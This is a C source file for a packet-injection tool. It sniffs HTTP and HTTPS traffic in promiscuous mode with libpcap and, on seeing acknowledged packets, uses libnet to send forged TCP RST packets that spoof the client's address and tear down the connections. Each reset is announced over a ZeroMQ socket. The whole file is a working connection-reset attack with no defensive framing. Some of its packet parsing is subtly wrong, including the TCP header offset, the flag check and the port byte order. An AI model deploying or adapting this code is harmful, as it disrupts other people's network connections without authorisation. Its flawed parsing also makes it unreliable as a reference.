#include <stdio.h>
#include <unistd.h> // getopt
#include <inttypes.h> // PRId64

#include <libnet.h>
#include <pcap.h>
#include <zmq.h>

/**
 * Data structure with all handles
 * (so that cleanup can be simplified).
 */
typedef struct _context_t {
    char *device; // pcap capture and libnet device (e.g. "en0"); leave blank to detect.

    pcap_t *pcap; // pcap handle

    libnet_t *libnet; // libnet handle
    u_long libnet_last_stats_at; // last time libnet stats were reported

    void *zmq_ctx;  // zeromq context
    void *zmq_pub;  // zeromq socket
} context_t;

static context_t ctx;

/**
 * Initialize ZeroMQ.
 *
 * @return 0 if successful, otherwise -1.
 */
int init_zeromq();

/**
 * Initialize libnet
 *
 * @return 0 if successful, otherwise -1.
 */
int init_libnet();

/**
 * Initialize libpcap
 *
 * @return 0 if successful, otherwise -1.
 */
int init_pcap();

/**
 * Clean up: Close all handles.
 *
 * This function can safely be called multiple times.
 */
void cleanup();

/**
 * Compile and set pcap packet filter, which will determine what gets sent to
 * the on_packet_captured function.
 *
 * @param filter_string BPF filter string http://biot.com/capstats/bpf.html
 * @return 0 if successful, otherwise -1.
 */
int set_pcap_filter(char *);

/**
 * Send a RST packet (spoofed from source client) to dest server.
 *
 * Should be sent to dest after SYN-ACK sent from dest -> source (so that we can use its ack#
 * as the next seq#).
 *
 * @param saddr client IP to spoof.
 * @param sport client port (in network byte order).
 * @param daddr server to send RST to.
 * @param dport server port (in network byte order).
 * @param ack ack# from previous SYN-ACK packet (in network byte order).
 * @return 0 if successful, otherwise -1.
 */
int send_reset_packet(struct sockaddr_in, uint16_t, struct sockaddr_in, uint16_t, uint32_t);

/**
 * Packet captured by pcap.
 *
 * @param user_args
 * @param cap_header
 * @param packet raw packet data.
 */
void on_packet_captured(u_char *, const struct pcap_pkthdr *, const u_char *);

/**
 * Signal trapped.
 *
 * @param signum signal number.
 */
void on_signal_trapped(int);

/**
 * Entrypoint
 *
 * @param argc
 * @param argv
 * @return exit code.
 */
int main(int argc, char **argv) {
    memset(&ctx, 0, sizeof(context_t));

    if (init_zeromq() != 0 || init_libnet() != 0 || init_pcap() != 0) {
        cleanup();
        return EXIT_FAILURE;
    }

    if (set_pcap_filter("tcp[tcpflags] & tcp-ack != 0 && ( port 80 or port 443 )") != 0) {
        cleanup();
        return EXIT_FAILURE;
    }

    // Listen for packets
    printf("Listening for packets on %s...\n", ctx.device);
    signal(SIGINT, on_signal_trapped); // Trap ^C
    pcap_loop(ctx.pcap, -1, on_packet_captured, NULL);

    // Cleanup
    cleanup();

    printf("Exiting...\n");
    return EXIT_SUCCESS;
}

int init_zeromq() {
    ctx.zmq_ctx = zmq_ctx_new();
    if (ctx.zmq_ctx == NULL) {
        perror("zmq_ctx_new() failed");
        return -1;
    }

    ctx.zmq_pub = zmq_socket(ctx.zmq_ctx, ZMQ_PUB);
    if (ctx.zmq_pub == NULL) {
        perror("zmq_socket() failed");
        return -1;
    }

    if (zmq_bind(ctx.zmq_pub, "tcp://*:5555") == -1) {
        perror("zmq_bind() failed");
        return -1;
    }

    return 0;
}

int init_libnet() {
    int injection_type = LIBNET_RAW4; // Lowest layer is IPv4

    char errbuf[LIBNET_ERRBUF_SIZE];

    ctx.libnet = libnet_init(injection_type, ctx.device, errbuf);
    if (ctx.libnet == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        return -1;
    }

    if (libnet_seed_prand(ctx.libnet) == -1) {
        fprintf(stderr, "libnet_seed_prand() failed: %s\n",
                libnet_geterror(ctx.libnet));
        return -1;
    }

    return 0;
}

int init_pcap() {
    const int snapshot_length = 2048;
    const int promiscuous = 1; // Promiscuous mode
    const int timeout = 1;

    char errbuf[PCAP_ERRBUF_SIZE];

    ctx.device = pcap_lookupdev(errbuf);
    if (ctx.device == NULL) {
        fprintf(stderr, "pcap_lookupdev() failed: %s\n", errbuf);
        return -1;
    }

    ctx.pcap = pcap_open_live(ctx.device, snapshot_length, promiscuous, timeout, errbuf);
    if (ctx.pcap == NULL) {
        fprintf(stderr, "pcap_open_live() failed: %s\n", errbuf);
        return -1;
    }

    return 0;
}

void cleanup() {
    if (ctx.pcap != NULL) {
        pcap_close(ctx.pcap);
        ctx.pcap = NULL;
        ctx.device = NULL;
    }

    if (ctx.libnet != NULL) {
        libnet_destroy(ctx.libnet);
        ctx.libnet = NULL;
    }

    if (ctx.zmq_pub != NULL) {
        zmq_close(ctx.zmq_pub);
        ctx.zmq_pub = NULL;
    }

    if (ctx.zmq_ctx != NULL) {
        zmq_ctx_destroy(ctx.zmq_ctx);
        ctx.zmq_ctx = NULL;
    }
}

int set_pcap_filter(char *filter_string) {
    struct bpf_program filter;

    if (pcap_compile(ctx.pcap, &filter, filter_string, 0, PCAP_NETMASK_UNKNOWN) == PCAP_ERROR) {
        pcap_perror(ctx.pcap, "pcap_compile() failed");
        return -1;
    }

    if (pcap_setfilter(ctx.pcap, &filter) == PCAP_ERROR) {
        pcap_perror(ctx.pcap, "pcap_setfilter() failed");
        return -1;
    }

    return 0;
}

int send_reset_packet(
        struct sockaddr_in saddr, uint16_t sport,
        struct sockaddr_in daddr, uint16_t dport,
        uint32_t ack) {
    static libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
    static libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER;

    const char *saddr_str = inet_ntoa(saddr.sin_addr);
    const char *daddr_str = inet_ntoa(daddr.sin_addr);

    printf("Resetting TCP connection from %s:%d <-> %s:%d\n",
           saddr_str, sport,
           daddr_str, dport);

    // Build TCP header
    tcp_tag = libnet_build_tcp(
            sport,                           // Source TCP port (pretend we are dst)
            dport,                           // Destination TCP port (send back to src)
            ack,                             // Sequence number (use previous ack)
            (uint32_t)libnet_get_prand(LIBNET_PRu32), // Acknowledgement number
            TH_RST,                          // Control flags (RST flag set only)
            (uint16_t)libnet_get_prand(LIBNET_PRu16), // Window size
            0,                               // Checksum
            0,                               // Urgent pointer
            LIBNET_TCP_H,                    // Packet size (so far)
            NULL,                            // Payload (none)
            0,                               // Payload length
            ctx.libnet,
            tcp_tag);
    if (tcp_tag == -1) {
        fprintf(stderr, "Error building TCP header: %s\n", libnet_geterror(ctx.libnet));
        libnet_clear_packet(ctx.libnet);
        tcp_tag = LIBNET_PTAG_INITIALIZER;
        ip_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Build IP header
    ip_tag = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_TCP_H,    // Packet size (so far)
            IPTOS_LOWDELAY,                  // TOS
            (uint16_t)libnet_get_prand(LIBNET_PRu16), // IP ID
            0,                               // IP frag flags/offset
            64,                              // TTL
            IPPROTO_TCP,                     // Transport protocol
            0,                               // Checksum (auto calculate)
            saddr.sin_addr.s_addr,           // Source IP (pretend we are dst)
            daddr.sin_addr.s_addr,           // Destination IP (send back to src)
            NULL,                            // Payload (none)
            0,                               // Payload length
            ctx.libnet,
            ip_tag);
    if (ip_tag == -1) {
        fprintf(stderr, "Error building IP header: %s\n", libnet_geterror(ctx.libnet));
        libnet_clear_packet(ctx.libnet);
        tcp_tag = LIBNET_PTAG_INITIALIZER;
        ip_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Write packet
    int bytes_written = libnet_write(ctx.libnet);
    if (bytes_written == -1) {
        fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ctx.libnet));
        libnet_clear_packet(ctx.libnet);
        tcp_tag = LIBNET_PTAG_INITIALIZER;
        ip_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Passing ptag to reuse packet instead of clearing (which is less CPU efficient)
    // libnet_clear_packet(ctx.libnet);

    // Publish zeromq message.
    if (ctx.zmq_pub != NULL) {
        char queue_message[500];
        snprintf(queue_message, (sizeof(queue_message) / sizeof(queue_message[0])) - 1,
                 "reset %s:%d %s:%d", saddr_str, sport, daddr_str, dport);
        if (zmq_send(ctx.zmq_pub, queue_message, strlen(queue_message), 0) == -1) {
            perror("zmq_send() failed");
        }
    }

    // Occasionally report packet sent/errors stats
    u_long curr_time = (u_long)time(0);
    if (ctx.libnet_last_stats_at == 0) {
        ctx.libnet_last_stats_at = curr_time;
    } else if (curr_time - ctx.libnet_last_stats_at > 10) {
        struct libnet_stats stat;
        libnet_stats(ctx.libnet, &stat);
        printf("Packets sent:  %" PRId64 " (%" PRId64 " bytes)\n"
               "Packet errors: %" PRId64 "\n",
               stat.packets_sent,
               stat.bytes_written,
               stat.packet_errors);
        ctx.libnet_last_stats_at = curr_time;
    }

    return 0;
}

void on_packet_captured(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
    struct libnet_ipv4_hdr *ip_hdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);
    struct libnet_tcp_hdr *tcp_hdr = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + LIBNET_TCP_H);

    // Get saddr/daddr from IPv4 header
    struct sockaddr_in saddr, daddr;
    memset(&saddr, 0, sizeof(saddr));
    memset(&daddr, 0, sizeof(daddr));
    saddr.sin_addr.s_addr = *((uint32_t *)&(ip_hdr->ip_src));
    daddr.sin_addr.s_addr = *((uint32_t *)&(ip_hdr->ip_dst));

    if (tcp_hdr->th_flags & (TH_SYN | TH_ACK)) {
        // SYN-ACK packet sent from dest to source, so send a RST packet
        // back to dest (spoofed as source).
        send_reset_packet(
                daddr, htons(tcp_hdr->th_dport),
                saddr, htons(tcp_hdr->th_sport),
                htonl(tcp_hdr->th_ack));
    }
}

void on_signal_trapped(int signum) {
    if (signum == SIGINT) {
        // ^C pressed
        if (ctx.pcap != NULL) {
            pcap_breakloop(ctx.pcap);
        }

        // pcap must be closed before pcap_loop() is exited
        cleanup();
    }
}
